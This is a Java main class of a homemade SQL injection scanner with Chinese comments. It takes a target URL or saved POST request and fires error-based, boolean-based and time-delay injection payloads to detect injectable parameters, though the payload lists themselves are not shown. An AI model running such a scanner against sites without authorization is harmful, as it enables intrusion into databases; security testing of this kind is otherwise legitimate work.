package com.sql.sqlinjecttool;


import com.sql.sqlinjecttool.inject.ErrorInject;
import com.sql.sqlinjecttool.inject.Inject;
import com.sql.sqlinjecttool.judge.Judge;
import com.sql.sqlinjecttool.paramOperation.ParamOperation;
import com.sql.sqlinjecttool.payload.BooleanPayload;
import com.sql.sqlinjecttool.payload.ErrorPayload;
import com.sql.sqlinjecttool.payload.SleepPayload;
import com.sql.sqlinjecttool.pojo.UserInput;
import com.sql.sqlinjecttool.util.HttpSend;
import com.sql.sqlinjecttool.util.ResolvingPost;
import com.sun.xml.internal.bind.v2.runtime.output.SAXOutput;


import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.List;
import java.util.Scanner;

import static com.sql.sqlinjecttool.payload.ErrorPayload.errorPayload;

//C:\Users\Dell\Desktop
public class Main {

    public static void main(String[] args) throws IOException {

        //设置一个按钮，用于开关检测 0代表检测开启 1代表关闭
        int button = 0;
        String input = "";
        UserInput correctInput ;
        String method ;
        ResolvingPost resolvingPostFirst = null;
        ResolvingPost resolvingPost = null;

        //收集用户输入
        Scanner scanner = new Scanner(System.in);
        System.out.println("是否为Post型注入,输入Y/N");
        String in= scanner.nextLine();

        if(in.equals("y")||in.equals("Y")){
            method ="POST";
            System.out.println("输入数据包路径");
            String path = scanner.nextLine();
            resolvingPostFirst = new ResolvingPost();
            resolvingPostFirst.CollectPost(path);

            resolvingPost = new ResolvingPost();
            resolvingPost.CollectPost(path);

            //构造ReslovingPost对象 对文件中post数据包中的内容进行解析并存储
            correctInput = new UserInput(resolvingPostFirst,method);
            //构建对象的时候发起的请求
            //设置post body 之后
        }else {
//               (in.equals("n")||in.equals("N")){
            method = "GET";
            System.out.println("输入要注入的url");
            input = scanner.nextLine();
            //创建get型正确请求作为之后判断依据
            correctInput = new UserInput(input);
        }

        System.out.println("完成正确数据包的请求与保存");

        ParamOperation paramOperation = new ParamOperation();
        Judge judge = new Judge();

        //首先探测有无报错信息
        String error = "'<>{}/a1\")(";


        String testErrorPayload = paramOperation.Connect(0,correctInput,URLEncoder.encode(error));
        System.out.println("报错信息探测中------------");

        UserInput testPayloadInput = null;
        if (correctInput.getMethod().equals("POST")){
            ResolvingPost resolvingPost1 = (ResolvingPost) resolvingPost.clone();
            if (resolvingPost.getMarkStatus()){
                String markValue =  resolvingPost1.getMarkValue();
                String errorPayload = paramOperation.markConnect(markValue, testErrorPayload);
                resolvingPost1.setHashMap(resolvingPost1.getMarkKey(), errorPayload);
                testPayloadInput = new UserInput(resolvingPost1,method);
            }
            else {
                paramOperation.addRequest(testErrorPayload,resolvingPost1);
                testPayloadInput =  new UserInput(resolvingPost1,method);
            }
        }else {
             String temp = correctInput.getFrontPart();
             testPayloadInput =new UserInput(temp+testErrorPayload);
        }


        int mark1=judge.ErrorJudge(testPayloadInput,0);

        if(mark1==1){
            System.out.println(mark1);
            System.out.println("检测到有回显的报错信息");
            button = 1;
        }else {
            System.out.println("页面无回显报错信息，不存在报错注入");
        }



        System.out.println("进行报错注入");
        for(int i = 0; i< errorPayload.size(); i++){
            UserInput errorPayloadInput =null;
            if (correctInput.getMethod().equals("POST")){
                ResolvingPost resolvingPost1 = (ResolvingPost) resolvingPost.clone();
                if (resolvingPost.getMarkStatus()){
                    String markValue =  resolvingPost1.getMarkValue();
                    String errorPayload = paramOperation.markConnect(markValue, ErrorPayload.errorPayload.get(i).toString());
                    resolvingPost1.setHashMap(resolvingPost1.getMarkKey(), errorPayload);
                    errorPayloadInput = new UserInput(resolvingPost1,method);
                }
                else {
                    paramOperation.addRequest(testErrorPayload,resolvingPost1);
                    errorPayloadInput =  new UserInput(resolvingPost1,method);

//                    String temp = correctInput.getFrontPart();
//                    System.out.println();
//                    errorPayloadInput =new UserInput(temp+errorPayload);
                }}
                else {
//                    String errorPayload = paramOperation.markConnect(0,)
//                    String temp = correctInput.getFrontPart();
//                    errorPayload
//                    errorPayloadInput =new UserInput(temp+errorPayload.get(i));
                }
                int mark= judge.ErrorJudge(errorPayloadInput,button);

                if(mark==1){
                    System.out.println(mark);
                    System.out.println("检测到sql注入，url为"+ URLDecoder.decode(errorPayloadInput.getUrl()));
                    button = 1;
                    break;
                }
            }





//                String errorPayload = paramOperation.Connect(0,correctInput,URLEncoder.encode(ErrorPayload.errorPayload.get(i).toString()));
//                if (correctInput.getMethod().equals("POST")){
//                    ResolvingPost resolvingPost1 = (ResolvingPost) resolvingPost.clone();
//                    paramOperation.addRequest(errorPayload,resolvingPost1);
//                    errorPayloadInput =  new UserInput(resolvingPost1,method);}
//                else {
//                    String temp = correctInput.getFrontPart();
//                    System.out.println();
//                    errorPayloadInput =new UserInput(temp+errorPayload);
//                }
//                int mark= judge.ErrorJudge(errorPayloadInput,button);
//
//                if(mark==1){
//                    System.out.println(mark);
//                    System.out.println("检测到sql注入，url为"+ URLDecoder.decode(errorPayloadInput.getUrl()));
//                    button = 1;
//                    break;
//                }
//            }


        System.out.println("-----进行boolean注入---");


        UserInput falesPayloadInput =null;
        UserInput turePayloadInput =null;

        for(int i =0;i<BooleanPayload.booleanFalesPayload.size();i++){
            //开关button 1 open      0 close
            if(button==1){
                System.out.println("跳过布尔型注入");
                break;}

            //目前拿到了修改后的payload
            String falesPayload = paramOperation.Connect(0,correctInput,URLEncoder.encode(BooleanPayload.booleanFalesPayload.get(i).toString()));
            String turePayload = paramOperation.Connect(0,correctInput,URLEncoder.encode(BooleanPayload.booleanTurePayload.get(i).toString()));

            System.out.println(falesPayload);
             if (correctInput.getMethod().equals("POST")){
                ResolvingPost resolvingPost1 = (ResolvingPost) resolvingPost.clone();
                ResolvingPost resolvingPost2 = (ResolvingPost) resolvingPost.clone();

                paramOperation.addRequest(falesPayload,resolvingPost1);
                paramOperation.addRequest(turePayload,resolvingPost2);
                falesPayloadInput =  new UserInput(resolvingPost1,method);
                turePayloadInput =  new UserInput(resolvingPost2,method);}
            else
            {
                String temp = correctInput.getFrontPart();
                System.out.println();
                falesPayloadInput =new UserInput(temp+falesPayload);
                turePayloadInput = new UserInput(temp+turePayload);
            }

            System.out.println("Ture型Payload返回包大小为"+falesPayloadInput.getHtmlLength());
            System.out.println("False型Payload返回包大小为"+turePayloadInput.getHtmlLength());
            if(judge.BooleanJudge(falesPayloadInput,turePayloadInput,button)==1){
                System.out.println("检测到sql注入，payload为"+URLDecoder.decode(falesPayloadInput.getUrl()));
                button = 1;
                break;
            }
        }
        if(button!=1){
            System.out.println("布尔盲注未发现结果");

            System.out.println("开始延时注入");}{
            System.out.println("开始跑数据");
        }


        button=0;
        for(int i =0;i< SleepPayload.sleepPayload.size();i++){
            if(button==1){
                System.out.println("跳过延时注入");
                break;
            }
            UserInput sleepPayloadInput =null;
            String sleepPayload = paramOperation.Connect(0,correctInput,URLEncoder.encode(SleepPayload.sleepPayload.get(i).toString()));
            if (correctInput.getMethod().equals("POST")){
                ResolvingPost resolvingPost1 = (ResolvingPost) resolvingPost.clone();

                paramOperation.addRequest(sleepPayload,resolvingPost1);
                sleepPayloadInput =  new UserInput(resolvingPost1,method);}
            else {
                String temp = correctInput.getFrontPart();
                System.out.println();
                sleepPayloadInput =new UserInput(temp+sleepPayload);
            }

            System.out.println(sleepPayloadInput.getStartTimeStamp());
            System.out.println(sleepPayloadInput.getEndTimeStamp());
            int mark= judge.SleepJudge(sleepPayloadInput,button);

            if(mark==1){
                System.out.println(mark);
                System.out.println("检测到sql注入，url为"+ URLDecoder.decode(sleepPayloadInput.getUrl()));
                button = 1;
                break;
            }
        }
    }
}



